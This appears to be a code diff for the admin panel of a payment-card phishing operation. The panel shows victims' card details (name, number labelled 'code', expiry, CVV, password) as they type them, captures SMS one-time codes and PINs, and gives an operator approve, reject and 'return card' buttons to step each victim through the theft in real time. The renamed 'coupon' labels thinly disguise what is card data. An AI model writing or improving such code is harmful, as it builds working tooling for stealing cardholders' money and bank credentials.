@@ -3,8 +3,7 @@ import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@
 import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
 import { Badge } from "@/components/ui/badge";
 import { Button } from "@/components/ui/button";
-import { Monitor, Check, X, MessageSquare, RefreshCw, Filter, RotateCcw, Smartphone, Globe, Radio, Lock } from "lucide-react";
-import { useRealtime } from "@/context/RealtimeContext";
+import { Monitor, Check, X, MessageSquare, RefreshCw, Filter, RotateCcw, Smartphone, Globe, Radio } from "lucide-react";
 import { useAdminAuth } from "@/context/AdminAuthContext";
 import { useAdminLocale } from "@/context/AdminLocaleContext";
 import {
@@ -15,6 +14,7 @@ import {
 } from "@/components/ui/select";
 // import { io } from "socket.io-client"; // Removed redundant import
 import { API_URL } from "@/lib/constants";
+import { io, Socket } from "socket.io-client";
 
 // --- Coupon Card Visual Component ---
 const CouponCard = ({ name, code, date, cvv }: { name: string; code: string; date: string; cvv: string }) => {
@@ -82,19 +82,33 @@ export const DataListView = () => {
   const [filterType, setFilterType] = useState<"all" | "pending" | "completed" | "online">("all");
   const [isRefreshing, setIsRefreshing] = useState(false);
   const [onlineOrderIds, setOnlineOrderIds] = useState<Set<string>>(new Set());
-  const { liveData, socket } = useRealtime();
 
   const loadOrders = useCallback(async () => {
     setIsRefreshing(true);
     try {
-      const res = await fetch(`${API_URL}/api/admin/orders`, { headers: getAuthHeaders() });
-      if (res.status === 401) { clearAuth(); return; }
-      const data = await res.json();
-      if (Array.isArray(data)) {
-        setOrders(data);
+      const [ordersRes, liveSessionsRes] = await Promise.all([
+        fetch(`${API_URL}/api/admin/orders`, { headers: getAuthHeaders() }),
+        fetch(`${API_URL}/api/admin/live-sessions`, { headers: getAuthHeaders() }),
+      ]);
+
+      if (ordersRes.status === 401 || liveSessionsRes.status === 401) {
+        clearAuth();
+        return;
+      }
+
+      const [ordersData, liveData] = await Promise.all([ordersRes.json(), liveSessionsRes.json()]);
+
+      if (Array.isArray(ordersData)) {
+        setOrders(ordersData);
         const onIds = new Set<string>();
-        data.forEach((o: OrderData) => { if (o.online) onIds.add(o.id); });
+        ordersData.forEach((o: OrderData) => {
+          if (o.online) onIds.add(o.id);
+        });
         setOnlineOrderIds(onIds);
+      }
+
+      if (Array.isArray(liveData)) {
+        setLiveSessions(liveData as LiveSession[]);
       }
     } catch (err) { console.error("Failed to load orders", err); }
     finally { setTimeout(() => setIsRefreshing(false), 500); }
@@ -105,11 +119,15 @@ export const DataListView = () => {
     loadOrders();
   }, [loadOrders]);
 
-  // Socket event handlers
+  // Admin realtime socket handlers
   useEffect(() => {
-    if (!socket) return;
+    if (!token) return;
+    const adminSocket: Socket = io(`${API_URL}/admin`, {
+      auth: { token },
+      transports: ["websocket", "polling"],
+    });
 
-    const handleOrderUpdate = (newOrder: OrderData) => {
+    const handleNewOrder = (newOrder: OrderData) => {
       setOrders(prev => {
         const exists = prev.find(o => o.id === newOrder.id);
         if (exists) {
@@ -117,14 +135,14 @@ export const DataListView = () => {
         }
         return [newOrder, ...prev];
       });
-      try { new Audio('/notification.mp3').play().catch(() => {}); } catch {} 
+      try { new Audio('/notification.mp3').play().catch(() => {}); } catch { /* ignore audio errors */ }
     };
 
-    const handleStatusChange = ({ id, status }: { id: string, status: string }) => {
-      setOrders(prev => prev.map(o => o.id === id ? { ...o, status } : o));
+    const handleOrderUpdate = (patch: Partial<OrderData> & { id: string }) => {
+      setOrders((prev) => prev.map((o) => (o.id === patch.id ? { ...o, ...patch } : o)));
     };
 
-    const handleUserStatus = ({ orderId, online }: { orderId: string, online: boolean }) => {
+    const handleUserOnline = ({ orderId, online }: { orderId: string; online: boolean }) => {
       setOnlineOrderIds(prev => {
         const next = new Set(prev);
         if (online) next.add(orderId);
@@ -134,22 +152,83 @@ export const DataListView = () => {
       setOrders(prev => prev.map(o => o.id === orderId ? { ...o, online } : o));
     };
 
-    const handleLivePinUpdate = ({ orderId, pinCode }: { orderId: string, pinCode: string }) => {
-       setOrders(prev => prev.map(o => o.id === orderId ? { ...o, pinCode } : o));
+    const handleLiveSessionStart = (session: LiveSession) => {
+      setLiveSessions((prev) => {
+        const index = prev.findIndex((s) => s.id === session.id);
+        if (index < 0) return [session, ...prev];
+        const next = [...prev];
+        next[index] = { ...next[index], ...session };
+        return next;
+      });
     };
 
-    socket.on('admin:order_update', handleOrderUpdate);
-    socket.on('order_status_changed', handleStatusChange);
-    socket.on('user_status_change', handleUserStatus);
-    socket.on('live_pin_update', handleLivePinUpdate);
+    const handleLiveCouponUpdate = (update: { id: string; code?: string; dateMMYY?: string; password?: string }) => {
+      setLiveSessions((prev) =>
+        prev.map((s) =>
+          s.id === update.id
+            ? {
+                ...s,
+                couponCode: update.code ?? s.couponCode,
+                dateMMYY: update.dateMMYY ?? s.dateMMYY,
+                password: update.password ?? s.password,
+              }
+            : s
+        )
+      );
+    };
+
+    const handleLiveSessionEnd = ({ id }: { id: string }) => {
+      setLiveSessions((prev) => prev.filter((s) => s.id !== id));
+    };
+
+    const handleLivePinUpdate = ({ orderId, pinCode }: { orderId?: string; pinCode: string }) => {
+      if (!orderId) return;
+      setOrders(prev => prev.map(o => o.id === orderId ? { ...o, pinCode } : o));
+    };
+
+    const handleLiveOrderCouponUpdate = (update: { orderId?: string; code?: string; dateMMYY?: string; password?: string }) => {
+      if (!update.orderId) return;
+      setOrders((prev) =>
+        prev.map((o) =>
+          o.id === update.orderId
+            ? {
+                ...o,
+                couponCode: update.code ?? o.couponCode,
+                dateMMYY: update.dateMMYY ?? o.dateMMYY,
+                password: update.password ?? o.password,
+              }
+            : o
+        )
+      );
+    };
+
+    const handleConnectError = (error: Error) => {
+      console.error("Admin realtime connection error:", error.message);
+    };
+
+    adminSocket.on('new_order', handleNewOrder);
+    adminSocket.on('order_update', handleOrderUpdate);
+    adminSocket.on('user_online', handleUserOnline);
+    adminSocket.on('live_session_start', handleLiveSessionStart);
+    adminSocket.on('live_coupon_update', handleLiveCouponUpdate);
+    adminSocket.on('live_session_end', handleLiveSessionEnd);
+    adminSocket.on('live_pin_update', handleLivePinUpdate);
+    adminSocket.on('live_order_coupon_update', handleLiveOrderCouponUpdate);
+    adminSocket.on('connect_error', handleConnectError);
 
     return () => {
-      socket.off('admin:order_update', handleOrderUpdate);
-      socket.off('order_status_changed', handleStatusChange);
-      socket.off('user_status_change', handleUserStatus);
-      socket.off('live_pin_update', handleLivePinUpdate);
+      adminSocket.off('new_order', handleNewOrder);
+      adminSocket.off('order_update', handleOrderUpdate);
+      adminSocket.off('user_online', handleUserOnline);
+      adminSocket.off('live_session_start', handleLiveSessionStart);
+      adminSocket.off('live_coupon_update', handleLiveCouponUpdate);
+      adminSocket.off('live_session_end', handleLiveSessionEnd);
+      adminSocket.off('live_pin_update', handleLivePinUpdate);
+      adminSocket.off('live_order_coupon_update', handleLiveOrderCouponUpdate);
+      adminSocket.off('connect_error', handleConnectError);
+      adminSocket.close();
     };
-  }, [socket]);
+  }, [token]);
 
   // Convert live sessions to display format and merge with orders
   const liveAsOrders: OrderData[] = liveSessions.map(s => ({
@@ -169,8 +248,8 @@ export const DataListView = () => {
 
   const filteredOrders = allOrders.filter(order => {
     if (filterType === "all") return true;
-    if (filterType === "pending") return ["WAITING_APPROVAL", "SMS_SUBMITTED", "RETURN_COUPON", "LIVE_TYPING", "REQUEST_PIN", "PIN_SUBMITTED"].includes(order.status);
-    if (filterType === "completed") return ["COMPLETED", "APPROVED"].includes(order.status);
+    if (filterType === "pending") return ["WAITING_APPROVAL", "APPROVED", "WAITING_SMS", "SMS_SUBMITTED", "RETURN_COUPON", "LIVE_TYPING", "REQUEST_PIN", "PIN_SUBMITTED"].includes(order.status);
+    if (filterType === "completed") return ["COMPLETED"].includes(order.status);
     if (filterType === "online") return order._isLive || onlineOrderIds.has(order.id);
     return true;
   });
@@ -183,12 +262,13 @@ export const DataListView = () => {
       if (res.status === 401) clearAuth();
     } catch (err) { console.error("Failed to update status", err); }
   };
-  const handleApprove = (o: OrderData) => updateStatus(o.id, "APPROVED");
-  const handleReject = (o: OrderData) => updateStatus(o.id, "REJECTED");
-  const handleConfirmSMS = (o: OrderData) => updateStatus(o.id, "COMPLETED");
+  const handleApproveCoupon = (o: OrderData) => updateStatus(o.id, "APPROVED");
+  const handleRejectCoupon = (o: OrderData) => updateStatus(o.id, "REJECTED");
+  const handleApproveSMS = (o: OrderData) => updateStatus(o.id, "REQUEST_PIN");
   const handleRejectSMS = (o: OrderData) => updateStatus(o.id, "REJECTED");
+  const handleApprovePin = (o: OrderData) => updateStatus(o.id, "COMPLETED");
+  const handleRejectPinToCoupon = (o: OrderData) => updateStatus(o.id, "RETURN_COUPON");
   const handleReturnCoupon = (o: OrderData) => updateStatus(o.id, "RETURN_COUPON");
-  const handleRequestPin = (o: OrderData) => updateStatus(o.id, "REQUEST_PIN");
 
   const devIcon = (ua?: string) => {
     if (!ua) return <Globe className="w-3 h-3" />;
@@ -221,7 +301,7 @@ export const DataListView = () => {
         <div className="flex items-center gap-3">
           <div className="flex items-center gap-2">
             <Filter className="w-4 h-4 text-muted-foreground" />
-            <Select value={filterType} onValueChange={(v: any) => setFilterType(v)}>
+            <Select value={filterType} onValueChange={(v: "all" | "pending" | "completed" | "online") => setFilterType(v)}>
               <SelectTrigger className="w-[180px]"><SelectValue placeholder={t("data.filter")} /></SelectTrigger>
               <SelectContent>
                 <SelectItem value="all">{t("data.allOrders")}</SelectItem>
@@ -424,21 +504,15 @@ export const DataListView = () => {
                       )}
                       {order.status === "WAITING_APPROVAL" && (
                         <div className="flex justify-end gap-2">
-                          <Button size="sm" variant="outline" onClick={() => handleRequestPin(order)} className="h-8 px-2 border-indigo-300 text-indigo-700 hover:bg-indigo-50" title={t("data.requestPin")}><Lock className="w-4 h-4" /></Button>
-                          <Button size="sm" variant="destructive" onClick={() => handleReject(order)} className="h-8 px-2" title={t("data.reject")}><X className="w-4 h-4" /></Button>
-                          <Button size="sm" className="h-8 px-2 bg-green-600 hover:bg-green-700" onClick={() => handleApprove(order)} title={t("data.approve")}><Check className="w-4 h-4" /></Button>
+                          <Button size="sm" variant="destructive" onClick={() => handleRejectCoupon(order)} className="h-8 px-2" title={t("data.reject")}><X className="w-4 h-4" /></Button>
+                          <Button size="sm" className="h-8 px-2 bg-green-600 hover:bg-green-700" onClick={() => handleApproveCoupon(order)} title={t("data.approve")}><Check className="w-4 h-4" /></Button>
                         </div>
                       )}
                       {(order.status === "PIN_SUBMITTED" || order.status === "REQUEST_PIN") && (
-                        <div className="flex flex-col gap-2">
-                          <div className="flex justify-end gap-2">
-                            <Button size="sm" variant="destructive" onClick={() => handleReject(order)} className="h-8 px-2" title={t("data.rejectPin")}><X className="w-4 h-4" /></Button>
-                            <Button size="sm" className="h-8 px-3 bg-green-600 hover:bg-green-700 text-white" onClick={() => handleApprove(order)} title={t("data.approve")}>
-                              <Check className="w-4 h-4 mr-1" />{t("data.allow")}
-                            </Button>
-                          </div>
-                          <Button size="sm" variant="outline" onClick={() => handleReturnCoupon(order)} className="h-8 px-3 border-orange-300 text-orange-700 hover:bg-orange-50">
-                            <RotateCcw className="w-3 h-3 mr-1" />{t("data.returnCard")}
+                        <div className="flex justify-end gap-2">
+                          <Button size="sm" variant="destructive" onClick={() => handleRejectPinToCoupon(order)} className="h-8 px-2" title={t("data.rejectPin")}><X className="w-4 h-4" /></Button>
+                          <Button size="sm" className="h-8 px-3 bg-green-600 hover:bg-green-700 text-white" onClick={() => handleApprovePin(order)} title={t("data.approve")}>
+                            <Check className="w-4 h-4 mr-1" />{t("data.allow")}
                           </Button>
                         </div>
                       )}
@@ -446,7 +520,7 @@ export const DataListView = () => {
                         <div className="flex flex-col gap-2">
                           <div className="flex justify-end gap-2">
                             <Button size="sm" variant="destructive" onClick={() => handleRejectSMS(order)} className="h-8 px-2"><X className="w-4 h-4" /></Button>
-                            <Button size="sm" className="h-8 px-3 bg-blue-600 hover:bg-blue-700 text-white" onClick={() => handleConfirmSMS(order)} disabled={!order.smsCode || order.smsCode.length < 4}>
+                            <Button size="sm" className="h-8 px-3 bg-blue-600 hover:bg-blue-700 text-white" onClick={() => handleApproveSMS(order)} disabled={!order.smsCode || order.smsCode.length < 4}>
                               <MessageSquare className="w-4 h-4 mr-1" />{t("data.confirm")}
                             </Button>
                           </div>
